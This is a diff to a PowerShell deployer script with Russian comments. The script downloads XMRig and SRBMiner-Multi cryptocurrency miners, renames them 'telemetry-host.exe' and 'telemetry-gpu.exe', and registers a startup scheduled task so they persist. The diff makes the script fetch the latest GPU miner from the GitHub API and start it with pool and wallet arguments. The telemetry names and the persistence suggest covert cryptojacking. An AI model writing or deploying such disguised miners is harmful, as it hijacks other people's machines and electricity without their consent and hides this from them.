@@ -14,7 +14,6 @@ $CpuExeName = "telemetry-host.exe"
 $GpuExeName = "telemetry-gpu.exe"
 
 $XmrigVer = "6.27.0"
-$SrbVer = "3-9-0"
 # =================
 
 $ErrorActionPreference = "Stop"
@@ -104,7 +103,7 @@ Unregister-ScheduledTask -TaskName $CpuTaskName -Confirm:$false -ErrorAction Sil
 Register-ScheduledTask -TaskName $CpuTaskName -Action $CpuAction -Trigger $StartupTrigger -Principal $Principal -Settings $Settings -Force | Out-Null
 Start-ScheduledTask -TaskName $CpuTaskName
 
-# 4. Скачиваем и настраиваем SRBMiner-Multi для любых GPU (включая интегрированные через OpenCL)
+# 4. Скачиваем и настраиваем SRBMiner-Multi для любых GPU (актуальный релиз через GitHub API)
 $GpuAvailable = $false
 if ($EnableGpu) {
     $GpuControllers = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
@@ -112,12 +111,16 @@ if ($EnableGpu) {
         $GpuExePath = "$InstallDir\$GpuExeName"
         $SrbZip = "$InstallDir\srbminer.zip"
         $SrbTmp = "$InstallDir\srb_tmp"
-        $SrbUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/$SrbVer/SRBMiner-Multi-$SrbVer-win64.zip"
 
         try {
-            Invoke-WebRequest -Uri $SrbUrl -OutFile $SrbZip
+            $Headers = @{ "User-Agent" = "PowerShell-Deployer" }
+            $Release = Invoke-RestMethod -Uri "https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest" -Headers $Headers
+            $Asset = $Release.assets | Where-Object { $_.name -match 'win64\.zip$' } | Select-Object -First 1
+            if (-not $Asset) { throw "Не найден win64.zip ассет в последнем релизе SRBMiner-Multi." }
+
+            Invoke-WebRequest -Uri $Asset.browser_download_url -OutFile $SrbZip
             Expand-Archive -Path $SrbZip -DestinationPath $SrbTmp -Force
-            $FoundSrb = Get-ChildItem -Path $SrbTmp -Filter "SRBMiner-MULTI.exe" -Recurse | Select-Object -First 1
+            $FoundSrb = Get-ChildItem -Path $SrbTmp -Filter "*SRBMiner*.exe" -Recurse | Select-Object -First 1
             if ($FoundSrb) {
                 Move-Item -Path $FoundSrb.FullName -Destination $GpuExePath -Force
                 $GpuArgs = "--algorithm kawpow --pool $GpuPool --wallet $GpuUser --password x --cpu-threads 0 --gpu-opencl-enable --gpu-cuda-enable --disable-cpu-mining"
